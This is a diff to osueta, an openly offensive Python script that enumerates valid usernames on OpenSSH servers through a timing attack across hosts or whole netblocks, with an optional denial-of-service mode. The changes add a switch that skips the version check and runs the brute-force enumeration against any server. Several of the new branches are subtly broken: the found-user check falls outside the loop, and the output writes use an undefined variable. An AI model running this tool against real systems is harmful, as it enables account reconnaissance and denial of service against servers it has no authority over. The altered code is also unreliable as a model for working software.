@@ -3,14 +3,17 @@
 __license__="""
 osueta (OpenSSH User Enumeration Timing Attack)
 
+Version 0.6
+
 A simple Python script to exploit the OpenSSH User Enumeration Timing Attack:
 
-http://cureblog.de/openssh-user-enumeration-time-based-attack/
-http://seclists.org/fulldisclosure/2013/Jul/88 
+	http://cureblog.de/openssh-user-enumeration-time-based-attack/
+	http://seclists.org/fulldisclosure/2013/Jul/88 
 
 Authors:
 	c0r3dump | coredump<@>autistici.org
 	rofen | rofen<@>gmx.de
+	jnieto | http://www.behindthefirewalls.com/
 
 Osueta project site: https://github.com/c0r3dump3d/osueta 
 
@@ -43,8 +46,8 @@ except ImportError:
 		
 def main():
  
-	parse = argparse.ArgumentParser(description='OpenSSH User Enumeration Time-Based Attack')
-	parse.add_argument('-H', action='store', dest='host', help='Host ip or CIDR netblock to attack.')
+	parse = argparse.ArgumentParser(description='OpenSSH User Enumeration Time-Based Attack Python script')
+	parse.add_argument('-H', action='store', dest='host', help='Host Ip or CIDR netblock.')
 	parse.add_argument('-k', action='store', dest='hfile', help='Host list in a file.')
 	parse.add_argument('-f', action='store', dest='fqdn', help='FQDN to attack.')
 	parse.add_argument('-p', action='store', dest='port', help='Host port.')
@@ -53,10 +56,11 @@ def main():
 	parse.add_argument('-d', action='store', dest='delay', help='Time delay in seconds (default 20 seconds).')
 	parse.add_argument('-v', action='store', dest='vari',default = 'yes', help='Make variations of the username (default yes).')
 	parse.add_argument('-o', action='store', dest='outp', help='Output file with positive results.')
+	parse.add_argument('-c', action='store', dest='vers', help='Check or not the OpenSSH version (default yes).')
 	parse.add_argument('--dos', action='store', dest='dos',default = 'no', help='Try to make a DOS attack (default no).')
 	parse.add_argument('-t', action='store', dest='threads',default = '5', help='Threads for the DOS attack (default 5).')
 	welcome()
-	print "Starting OSUETA v0.5 (https://github.com/c0r3dump3d/osueta) at " + time.strftime("%x") + " " + time.strftime("%X")
+	print "Starting OSUETA v0.6 (https://github.com/c0r3dump3d/osueta) at " + time.strftime("%x") + " " + time.strftime("%X")
 	print
 	start_time = time.time()
 	argus=parse.parse_args()
@@ -76,6 +80,10 @@ def main():
 	else:
 		hosts=[]
 		numhost = 0
+		if argus.vers != None:
+			vers = argus.vers
+		else:
+			vers = 'yes'
 		if argus.outp != None:
 			fileOutput = open(argus.outp,'w')
 			fileOutput.write("OSUETA v0.5 (https://github.com/c0r3dump3d/osueta) at " + time.strftime("%x") + " " + time.strftime("%X") + "\n")
@@ -146,9 +154,11 @@ def main():
 		userfdos=None
 		numop = 0
 		start_time = time.time()
+		nt = 1
 		for ip in hosts:
-			print "Trying " + ip +" ...",
+			print "[+] " + "("+str(nt)+"/"+str(len(hosts))+")"+" Trying " + ip +" ...",
 			state=prevScann(ip,port)
+			nt = nt + 1
 			if state == 'open':
 				numop = numop + 1
 			hoststate[ip]=state
@@ -172,38 +182,40 @@ def main():
 						exit(1)
 					foundUser = []
 					print
-					banner = sshBanner(host,port)
-					bannervuln = ['OpenSSH 5', 'OpenSSH 6']
-					if banner[0:9] in bannervuln:
-						print "[++] This version is perhaps vulnerable, we continue with the brutefroce attack ..."
-						print
-						print '======================================'
+					if vers == 'yes':
+
+						banner = sshBanner(host,port)
+						bannervuln = ['OpenSSH 5', 'OpenSSH 6']
+						if banner[0:9] in bannervuln:
+							print "[++] This version is perhaps vulnerable, we continue with the brutefroce attack ..."
+							print
+							print '======================================'
+							userNames = prepareUserNames(userFile,vari)            
+							for userName in userNames:
+								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+								fUser = sshTime(host,port,userName,sock,defTime)
+							if fUser != -1 and fUser !=None:
+								foundUser.append(fUser)
+							sock.close()
+							print_success(foundUser, banner)
+							if argus.outp != None:
+								fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
+						else:
+							print "[-] This version is not vulnerable."
+							print "[-] Nothing to do."
+					else:
+						banner = sshBanner(host,port)
 						userNames = prepareUserNames(userFile,vari)            
 						for userName in userNames:
 							sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 							fUser = sshTime(host,port,userName,sock,defTime)
-							if fUser != -1 and fUser !=None:
-								foundUser.append(fUser)
-							sock.close()
-						if len(foundUser) == 0:
-							print "No users found." 
-							print '======================================'
-						else:	 
-							print
-							print "Server version: " + banner
-							print
-							print "Users found      Time delay in seconds"
-							print "--------------------------------------"
-							for entry in foundUser:
-								if entry != -1:
-									userfdos = entry[0]
-									print entry[0] + "                      " + str(entry[3])
-									if argus.outp != None:
-										fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
-							print '======================================'
-					else:
-							print "[-] This version is not vulnerable."
-							print "[-] Nothing to do."
+						if fUser != -1 and fUser !=None:
+							foundUser.append(fUser)
+						sock.close()
+						print_success(foundUser, banner)
+						if argus.outp != None:
+							fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
+
 				else: 
 					print
 					banner = sshBanner(host,port)
@@ -211,22 +223,52 @@ def main():
 					foundUser = []
 					user = argus.user
 					
-					if vari == 'yes':
-						userNames =  createUserNameVariationsFor(user)
-						userNames = list(set(userNames))
-						for userName in userNames:
+					if vers == 'yes':
+						bannervuln = ['OpenSSH 5', 'OpenSSH 6']
+						if banner[0:9] in bannervuln:
+							print "[++] This version is perhaps vulnerable, we continue with the brutefroce attack ..."
+							print
+							print '======================================'
+							if vari == 'yes':
+								userNames =  createUserNameVariationsFor(user)
+								userNames = list(set(userNames))
+								for userName in userNames:
+									sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+									fUser = sshTime(host,port,userName,sock,defTime)
+									if fUser != -1 and fUser !=None:
+										foundUser.append(fUser)
+									sock.close()
+							if vari == 'no':
+								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+								fUser = sshTime(host,port,user,sock,defTime)
+								if fUser != -1 and fUser !=None:
+									foundUser.append(fUser)
+								sock.close()
+							print_success(foundUser, banner)
+							if argus.outp != None:
+								fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
+						else:
+							print "[-] This version is not vulnerable."
+							print "[-] Nothing to do."
+					else:
+						if vari == 'yes':
+							userNames =  createUserNameVariationsFor(user)
+							userNames = list(set(userNames))
+							for userName in userNames:
+								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+								fUser = sshTime(host,port,userName,sock,defTime)
+								if fUser != -1 and fUser !=None:
+									foundUser.append(fUser)
+								sock.close()
+						if vari == 'no':
 							sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-							fUser = sshTime(host,port,userName,sock,defTime)
+							fUser = sshTime(host,port,user,sock,defTime)
 							if fUser != -1 and fUser !=None:
 								foundUser.append(fUser)
 							sock.close()
-					if vari == 'no':
-						sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-						fUser = sshTime(host,port,user,sock,defTime)
-						if fUser != -1 and fUser !=None:
-							foundUser.append(fUser)
-						sock.close()
-					print_success(foundUser, banner)
+						print_success(foundUser, banner)
+						if argus.outp != None:
+							fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
 				if dos == 'yes':
 					if userfdos != None:
 
